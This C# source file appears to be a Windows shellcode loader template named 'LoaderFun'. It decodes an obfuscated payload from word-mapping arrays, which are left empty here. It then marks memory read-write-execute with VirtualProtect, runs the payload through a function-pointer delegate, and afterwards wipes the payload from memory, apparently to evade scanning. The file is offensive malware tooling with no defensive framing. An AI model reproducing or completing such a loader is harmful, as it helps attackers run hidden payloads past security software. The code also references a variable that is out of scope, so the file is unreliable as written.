using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace LoaderFun
{
    internal class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate IntPtr ShellcodeCaller();

        [DllImport("kernel32.dll")]


        static extern bool VirtualProtect(IntPtr hProcess, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

        static byte[] data = null;
        static IntPtr allocated = IntPtr.Zero;
        static Random rand = new Random();
        static uint PAGE_EXECUTE_READWRITE = 0x40;
		static uint PAGE_EXECUTE_READ = 0x20;

        private static void LetsHaveFun(byte[] datathread)
        {
            allocated = Marshal.AllocHGlobal(datathread.Length);
            uint old = 0;
            VirtualProtect(allocated, (UInt32)datathread.Length, PAGE_EXECUTE_READWRITE, out old);
            Marshal.Copy(datathread, 0, allocated, datathread.Length);
            var loader = Marshal.GetDelegateForFunctionPointer<ShellcodeCaller>(allocated);
            loader();
        }

        static void Main(string[] args)
        {
            string[] mapping = new string[] { "" };
			string[] payload = new string[] { "" };
            data = new byte[payload.Length];
            for(int i = 0; i < payload.Length; i++)
            {
                data[i] = (byte)Array.IndexOf(mapping, payload[i]);
            }

            Thread t = new Thread(() => LetsHaveFun(data));
            t.Start();

            Thread.Sleep(12000);

            unsafe
            {
                int size = data.Length;
                byte[] nullstr = new byte[size];
                for(int i = 0; i < nullstr.Length; i++)
                {
                    nullstr[i] = (byte)0xcc;
                }
                fixed(byte* ptr = data)
                {
                    Marshal.Copy(nullstr, 0, new IntPtr(ptr), size);
                    Marshal.Copy(nullstr, 0, allocated, size);
					Console.WriteLine("ptr is at 0x" + new IntPtr(ptr).ToString("X"));
					Console.WriteLine("allocated is at 0x" + allocated.ToString("X"));
					uint old = 0;
					VirtualProtect(allocated, (UInt32)datathread.Length, PAGE_EXECUTE_READ, out old);
                }
            }
			Console.WriteLine("completed");
			
        }
    }
}
